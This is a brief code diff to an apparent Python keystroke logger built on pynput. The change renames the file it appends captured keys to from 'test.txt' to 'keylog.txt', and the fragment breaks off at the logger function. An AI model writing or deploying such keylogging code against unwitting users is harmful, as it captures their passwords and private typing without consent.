@@ -1,9 +1,9 @@
 from pynput import keyboard
 
 def get_info(key):
-    with open('test.txt', 'r') as fil:
+    with open('keylog.txt', 'r') as fil:
         words = fil.read()
-    with open('test.txt', 'w') as fil:
+    with open('keylog.txt', 'w') as fil:
         fil.write(words + key)
 
 def logger(key):
